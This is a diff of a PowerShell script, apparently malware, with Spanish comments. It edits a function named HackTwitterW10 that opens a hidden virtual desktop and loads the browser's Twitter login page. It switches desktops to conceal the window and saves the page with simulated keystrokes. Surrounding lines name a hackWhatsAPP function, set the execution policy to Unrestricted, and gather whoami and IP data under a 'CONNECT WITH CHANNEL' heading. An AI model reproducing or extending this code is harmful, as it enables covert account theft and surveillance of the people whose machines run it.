@@ -251,7 +251,7 @@ function HackTwitterW10 {
     #>
 
     # Inicia un virtual desktop.
-$KeyShortcut = Add-Type -MemberDefinition @"
+    $KeyShortcut = Add-Type -MemberDefinition @"
 [DllImport("user32.dll")]
 static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
 //WIN + CTRL + D: Create a new desktop
@@ -267,49 +267,68 @@ public static void CreateVirtualDesktopInWin10()
     keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
     keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
 }
+
 "@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru
    
-   # Cambia de virtual desktop.
-$KeyShortcut2 = Add-Type -MemberDefinition @"
+    # Cambia al virtual desktop de la izquierda.
+    $KeyShortcut2 = Add-Type -MemberDefinition @"
 [DllImport("user32.dll")]
 static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-//WIN + CTRL + D: Create a new desktop
-public static void SwitchVirtualDesktopInWin10()
+//WIN + CTRL + LEFT: Switch desktop
+public static void SwitchLeftVirtualDesktopInWin10()
 {
     //Key down
     keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
     keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
-    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //D
+    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
     //Key up
     
     keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
     keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
     keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
 }
-"@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru    
+"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    
+
+    # Cambia al virtual desktop de la derecha.
+    $KeyShortcut3 = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + LEFT: Switch desktop
+public static void SwitchRightVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
+}
+"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
 
     
     $KeyShortcut::CreateVirtualDesktopInWin10()
-    $KeyShortcut::SwitchVirtualDesktopInWin10()
-    Start-Sleep -Seconds 2
-
+    
     # Inicia el navegador por defecto y abre twitter.
     $mainBrowser = mainBrowser 
     Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/login' 
-
     Start-Sleep -Seconds 2
     $wshell = New-Object -ComObject wscript.shell
+    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
+
+    # Espera 10 segundos a cargar completamente la página
+    Start-sleep -Seconds 10
 
     # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
+    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('Iniciar sesión en Twitter') 
-
-    # Espera 10 segundos a cargar completamente la página y la descarga en html
-    Start-sleep -Seconds 10
     $wshell.SendKeys("^{s}") 
     $wshell.AppActivate('Guardar como')
     Sleep -Seconds 2 
     $wshell.SendKeys('~') 
-
+    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 }
 
 function hackWhatsAPP {
@@ -334,6 +353,7 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 ##########################
 ## CONNECT WITH CHANNEL ##
 ##########################
+
 $whoami = Invoke-Expression whoami
 $ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
 $ipV4 = $ipV4.IPAddressToString
